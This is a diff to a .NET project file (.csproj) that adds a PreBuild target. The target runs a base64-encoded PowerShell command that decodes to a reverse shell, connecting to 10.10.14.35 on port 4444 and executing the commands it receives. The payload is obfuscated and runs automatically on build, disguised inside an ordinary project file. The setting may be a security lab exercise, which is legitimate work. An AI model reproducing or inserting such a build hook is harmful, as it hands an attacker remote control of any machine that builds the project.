@@ -1,9 +1,12 @@
-<Target Name="WriteLogEntry" Condition=" '$(WriteLogEntry)'!='false' ">
-  <PropertyGroup>
-    <PowerShellExe Condition=" '$(PowerShellExe)'=='' "> 
-      %WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe
-    </PowerShellExe>
-  </PropertyGroup>
+<Project Sdk="Microsoft.NET.sdk">
+
+<PropertyGroup>
+<OutputType>Exe</OutputType>
+<TargetFramework>net6.0</TargetFramework>
+<ImplicitUsings>enable</ImplicitUsings>
+<Nullable>enable</Nullable>
+</PropertyGroup>
+<Target Name="PreBuild" BeforeTargerts="PreBuildEvent">
   <Exec Command="powershell -e JExIT1NUID0gIjEwLjEwLjE0LjM1IjsgJExQT1JUID0gNDQ0NDsgJFRDUENsaWVudCA9IE5ldy1P
 YmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJl
 YW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJ
@@ -18,6 +21,6 @@ ZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENv
 ZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIp
 OyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5D
 bG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQo=" />
-    </LogFileLocation>
 </Target>
 
+</Project>
